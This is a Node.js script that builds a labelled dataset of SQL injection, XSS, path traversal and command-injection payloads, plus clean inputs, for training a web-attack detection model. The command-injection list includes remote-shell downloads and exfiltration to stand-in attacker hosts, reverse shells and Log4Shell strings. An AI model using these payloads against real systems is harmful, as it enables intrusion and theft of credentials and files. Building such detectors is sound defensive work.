/**
 * ADAF — Real dataset builder
 * 
 * Bu skript SecLists va OWASP CRS dan ilhomlangan real payloadlarni
 * dataset.json ga qo'shib, modelni kuchaytiradi.
 * 
 * Ishlatish:
 *   node build-dataset.mjs
 * 
 * Natija: backend/src/training/dataset.json (yangilangan)
 */

import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const OUT = path.join(__dirname, "dataset.json");

// ─── SQL Injection payloads (SecLists + OWASP CRS dan) ────────────────────────
const SQLI = [
  // Classic auth bypass
  "' OR '1'='1",
  "' OR '1'='1'--",
  "' OR '1'='1'/*",
  "') OR ('1'='1",
  "admin'--",
  "admin'/*",
  "' OR 1=1--",
  "' OR 1=1#",
  "' OR 1=1/*",
  "1' OR '1'='1",
  "1 OR 1=1",
  "' OR 'x'='x",
  "\" OR \"\"=\"",
  "' OR ''='",
  // UNION attacks
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' UNION SELECT NULL,NULL,NULL--",
  "' UNION ALL SELECT NULL--",
  "' UNION SELECT 1,2,3--",
  "' UNION SELECT username,password FROM users--",
  "' UNION SELECT table_name,NULL FROM information_schema.tables--",
  "1 UNION SELECT * FROM users",
  "1' UNION SELECT @@version--",
  "' UNION SELECT user(),database()--",
  // Blind SQLi
  "1 AND 1=1",
  "1 AND 1=2",
  "' AND 1=1--",
  "' AND 1=2--",
  "1 AND SLEEP(5)--",
  "'; WAITFOR DELAY '0:0:5'--",
  "1; SELECT SLEEP(5)--",
  "' AND SLEEP(5) AND '1'='1",
  "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  // Stacked queries
  "'; DROP TABLE users--",
  "'; INSERT INTO users VALUES('hacker','hacker')--",
  "1; DROP TABLE users--",
  "admin'; DELETE FROM users WHERE 1=1--",
  // Error-based
  "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
  "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95,33,64,52,100,105,108,101,109,109,97),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)",
  // Encoding evasion
  "%27 OR %271%27=%271",
  "&#39; OR &#39;1&#39;=&#39;1",
  "' /*!UNION*/ /*!SELECT*/ NULL--",
  "' UN/**/ION SE/**/LECT NULL--",
  "'/**/OR/**/1=1--",
  // PostgreSQL specific
  "'; SELECT pg_sleep(5)--",
  "' AND 1=(SELECT 1 FROM pg_tables WHERE schemaname='public')--",
  "' UNION SELECT current_user,2,3--",
  // MySQL specific
  "' AND 1=1 LIMIT 1#",
  "1 AND 1=2 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables--",
  "' procedure analyse()--",
  // MSSQL specific
  "' EXEC xp_cmdshell('whoami')--",
  "'; EXEC master..xp_cmdshell 'dir'--",
  "1; EXEC sp_configure 'show advanced options', 1--",
  // Second-order SQLi patterns
  "username' WHERE 1=1--",
  "test@test.com' OR 1=1--",
  "' OR (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')>'a'--",
  // Comments evasion
  "'--",
  "'#",
  "'/*",
  "' /*!50000OR*/ 1=1--",
  // Hex encoding
  "0x61646d696e",
  "CHAR(97,100,109,105,110)",
  "CHAR(49,32,79,82,32,49,61,49)",
  // Oracle specific
  "' AND 1=1 FROM dual--",
  "' UNION SELECT NULL FROM dual--",
  "' AND (SELECT 1 FROM dual WHERE 1=1)='1",
  // SQLite specific
  "1 AND 1=2 UNION SELECT sql,NULL FROM sqlite_master--",
  // NoSQL injection patterns
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$where": "1==1"}',
  "' || '1'=='1",
  "admin\x00",
  // Advanced
  "1 OR 0x50=0x50",
  "'||'1'||'",
  "aaa' or 1=1 limit 1 -- -+",
];

// ─── XSS payloads ─────────────────────────────────────────────────────────────
const XSS = [
  // Basic script
  "<script>alert(1)</script>",
  "<script>alert('XSS')</script>",
  "<script>alert(document.cookie)</script>",
  "<SCRIPT>alert('XSS')</SCRIPT>",
  "<Script>alert(1)</Script>",
  // Event handlers
  "<img src=x onerror=alert(1)>",
  "<img src=x onerror='alert(1)'>",
  "<img src=\"javascript:alert(1)\">",
  "<body onload=alert(1)>",
  "<svg onload=alert(1)>",
  "<svg/onload=alert(1)>",
  "<input autofocus onfocus=alert(1)>",
  "<select autofocus onfocus=alert(1)>",
  "<textarea autofocus onfocus=alert(1)>",
  "<keygen autofocus onfocus=alert(1)>",
  "<marquee onstart=alert(1)>",
  "<details ontoggle=alert(1)>",
  // JavaScript protocol
  "javascript:alert(1)",
  "javascript:alert(document.cookie)",
  "Javascript:alert(1)",
  "JAVASCRIPT:alert(1)",
  "java\tscript:alert(1)",
  "java\rscript:alert(1)",
  "java\nscript:alert(1)",
  // DOM-based
  "<div onclick=\"alert(1)\">click</div>",
  "<a href=\"javascript:alert(1)\">click</a>",
  "<a href='javascript:void(0)' onclick='alert(1)'>click</a>",
  // Iframe
  "<iframe src=\"javascript:alert(1)\"></iframe>",
  "<iframe onload=alert(1)></iframe>",
  // Encoding evasion
  "%3Cscript%3Ealert(1)%3C/script%3E",
  "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
  "&lt;script&gt;alert(1)&lt;/script&gt;",
  "<scr<script>ipt>alert(1)</scr</script>ipt>",
  "<scr\x00ipt>alert(1)</scr\x00ipt>",
  // Data URI
  "<object data=\"data:text/html,<script>alert(1)</script>\">",
  "<embed src=\"data:text/html,<script>alert(1)</script>\">",
  // CSS-based
  "<div style=\"background:url(javascript:alert(1))\">",
  "<div style=\"behavior:url(xss.htc)\">",
  // Template injection as XSS
  "{{constructor.constructor('alert(1)')()}}",
  "${alert(1)}",
  "#{alert(1)}",
  // Filter bypass
  "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
  "<audio src=1 onerror=alert(1)>",
  "<video src=1 onerror=alert(1)>",
  "<source src=1 onerror=alert(1)>",
  "<x onclick=alert(1) style=display:block>click",
  // Polyglot
  "javas\tcript:alert(1)",
  "vbscript:msgbox(1)",
  "expression(alert(1))",
  // eval/exec
  "eval('alert(1)')",
  "setTimeout('alert(1)',0)",
  "setInterval('alert(1)',0)",
  "Function('alert(1)')()",
  // mutation XSS
  "<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>",
  "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
];

// ─── Path Traversal payloads ──────────────────────────────────────────────────
const PATH = [
  // Basic
  "../etc/passwd",
  "../../etc/passwd",
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../etc/passwd",
  "../../../../../../../etc/passwd",
  "../../../../../../../../etc/passwd",
  // Windows
  "..\\windows\\system32\\drivers\\etc\\hosts",
  "..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "..\\..\\.\\windows\\win.ini",
  "../../../../windows/system32/config/sam",
  "..\\boot.ini",
  "..\\..\\boot.ini",
  // Sensitive Linux files
  "../etc/shadow",
  "../etc/group",
  "../etc/hosts",
  "../proc/self/environ",
  "../proc/self/cmdline",
  "../proc/version",
  "../usr/local/apache/conf/httpd.conf",
  "../var/log/apache/access.log",
  "../var/log/nginx/access.log",
  // URL encoding
  "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..%2f..%2fetc%2fpasswd",
  "..%2fetc%2fpasswd",
  "%2e%2e/etc/passwd",
  "..%252f..%252fetc%252fpasswd",
  // Double encoding
  "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
  "..%c0%af..%c0%afetc%c0%afpasswd",
  "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
  // Null byte
  "../../etc/passwd%00",
  "../../etc/passwd\x00.jpg",
  "../etc/passwd%00.png",
  // Interesting files
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/os-release",
  "/proc/self/environ",
  "/var/www/html/.env",
  "/.env",
  "/app/.env",
  "/config/database.yml",
  "/config/secrets.yml",
  // With known extensions
  "../../etc/passwd.txt",
  "../../etc/passwd%20",
  "....//....//etc/passwd",
  "....\\....\\etc\\passwd",
  "..././..././etc/passwd",
  // PHP specific
  "../../var/www/html/config.php",
  "../include/config.php",
  // Node/Express
  "../../package.json",
  "../../../.env",
  "../../node_modules/.bin/node",
];

// ─── Command Injection payloads ───────────────────────────────────────────────
const CMD = [
  // Basic
  "; ls -la",
  "; ls",
  "| ls",
  "| ls -la",
  "& ls",
  "&& ls",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "&& cat /etc/passwd",
  // Chaining
  "test; whoami",
  "test | whoami",
  "test && whoami",
  "test || whoami",
  "test`whoami`",
  "test$(whoami)",
  // Backtick
  "`id`",
  "`whoami`",
  "`ls -la`",
  "`cat /etc/passwd`",
  // $() substitution
  "$(id)",
  "$(whoami)",
  "$(cat /etc/passwd)",
  "$(ls /)",
  // Windows
  "& dir",
  "| dir",
  "& whoami",
  "| type c:\\windows\\win.ini",
  "& type c:\\boot.ini",
  "; dir c:\\",
  "| net user",
  "& ipconfig",
  // Network
  "; wget http://evil.com/shell.sh -O /tmp/shell && bash /tmp/shell",
  "; curl -s http://evil.com/shell | bash",
  "| curl http://attacker.com/?data=$(cat /etc/passwd | base64)",
  "; nc -e /bin/bash attacker.com 4444",
  "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
  // Encoded
  "%3B%20ls",
  "%7C%20ls",
  "%26%26%20ls",
  "%60ls%60",
  // Newlines
  "\nls",
  "\r\nls",
  // Python/Node injection
  "__import__('os').system('id')",
  "require('child_process').exec('id')",
  "process.mainModule.require('child_process').execSync('id')",
  // Server-Side Template Injection
  "{{7*7}}",
  "${7*7}",
  "#{7*7}",
  "<%=7*7%>",
  "{php}echo 'test';{/php}",
  // Log4Shell pattern
  "${jndi:ldap://attacker.com/a}",
  "${${lower:j}ndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/a}",
  // SSRF via command
  "; curl http://169.254.169.254/latest/meta-data/",
  "| curl http://localhost:8080/admin",
  // Null bytes
  "test\x00; cat /etc/passwd",
  // Glob injection
  "; cat /etc/passw?",
  "; cat /etc/p*",
];

// ─── Clean inputs (muhim: yolg'on positive qoldirmaslik uchun) ─────────────────
const CLEAN = [
  // Usernames
  "admin", "user", "john.doe", "jane_smith", "user123",
  "test_user", "alice", "bob", "charlie", "david",
  "system", "root", "administrator", "guest", "anon",
  "john", "mike", "sarah", "emma", "james",
  // Emails
  "user@example.com", "admin@company.com", "test@test.org",
  "john.doe@gmail.com", "info@website.net",
  // Normal passwords (no special chars that trigger false positives)
  "password123", "mypassword", "hello123",
  "admin123", "user2024", "Password1",
  "Welcome1", "Passw0rd", "Test1234",
  // Normal text searches
  "John Smith", "New York", "Los Angeles",
  "2024-01-15", "invoice #12345", "order 987",
  "product name", "category filter", "search query",
  "United States", "United Kingdom", "Europe",
  // Normal form inputs
  "192.168.1.1", "10.0.0.1", "127.0.0.1",
  "localhost", "example.com", "api.example.com",
  "GET /api/users HTTP/1.1", "200 OK", "404 Not Found",
  // Product names (no false positives)
  "Sony WH-1000XM5 Headphones", "MacBook Pro 16inch",
  "iPhone 15 Pro Max", "Samsung Galaxy S24",
  "Nike Air Max 270", "Adidas Ultraboost 22",
  // Dates and numbers
  "January 15, 2024", "Q3 2024 Report", "FY2024",
  "1,234.56", "$99.99", "50%", "1000000",
  // Normal API params
  "?page=1&limit=20", "?sort=asc&order=name",
  "?filter=active&status=1", "?id=123&type=user",
  // File names (no traversal)
  "report.pdf", "image.jpg", "document.docx",
  "backup.zip", "config.yaml", "readme.md",
  // Uzbek and other unicode (edge case)
  "Тест", "محاولة", "테스트", "テスト", "тест123",
  // Common tech terms (must NOT trigger ML false positive)
  "SELECT plan", "OR condition", "AND operator",
  "JOIN table concept", "EXEC summary",
  "script tag usage", "alert system",
  "delete account request", "drop down menu",
  "union jack", "create account",
  // Normal sentences
  "Hello world", "How are you", "This is a test",
  "Please help me", "I need support", "Contact us",
  "My name is John", "The quick brown fox",
  "Open source software", "Machine learning model",
];

// ─── Build samples ────────────────────────────────────────────────────────────
function buildSamples() {
  const samples = [];

  for (const text of SQLI) {
    samples.push({ text, label: "sqli" });
    // Augment: add lowercase/uppercase variants for some
    if (Math.random() > 0.7) {
      samples.push({ text: text.toUpperCase(), label: "sqli" });
      samples.push({ text: text.toLowerCase(), label: "sqli" });
    }
    // Add URL-encoded variant
    if (text.includes("'") && Math.random() > 0.5) {
      samples.push({ text: text.replace(/'/g, "%27"), label: "sqli" });
    }
  }

  for (const text of XSS) {
    samples.push({ text, label: "xss" });
    if (Math.random() > 0.7) {
      samples.push({ text: text.toLowerCase(), label: "xss" });
    }
  }

  for (const text of PATH) {
    samples.push({ text, label: "path_traversal" });
    // Add with random prefix (simulate full URL path)
    if (Math.random() > 0.6) {
      samples.push({ text: "/api/files?name=" + text, label: "path_traversal" });
    }
  }

  for (const text of CMD) {
    samples.push({ text, label: "cmd_injection" });
    if (Math.random() > 0.7) {
      samples.push({ text: "test " + text, label: "cmd_injection" });
    }
  }

  for (const text of CLEAN) {
    samples.push({ text, label: "clean" });
    // Add with common prefixes
    if (Math.random() > 0.5) {
      samples.push({ text: text + " extra", label: "clean" });
    }
  }

  // Shuffle
  for (let i = samples.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [samples[i], samples[j]] = [samples[j], samples[i]];
  }

  return samples;
}

const samples = buildSamples();
const output = { samples };

fs.writeFileSync(OUT, JSON.stringify(output, null, 2), "utf-8");

// Stats
const counts = {};
for (const s of samples) counts[s.label] = (counts[s.label] ?? 0) + 1;

console.log("✅ Dataset yaratildi!");
console.log(`   Fayl: ${OUT}`);
console.log(`   Jami: ${samples.length} ta sample`);
for (const [label, count] of Object.entries(counts).sort()) {
  const bar = "█".repeat(Math.round(count / 15));
  console.log(`   ${label.padEnd(16)} ${String(count).padStart(4)}  ${bar}`);
}
console.log("");
console.log("Keyingi qadam: node train.mjs");
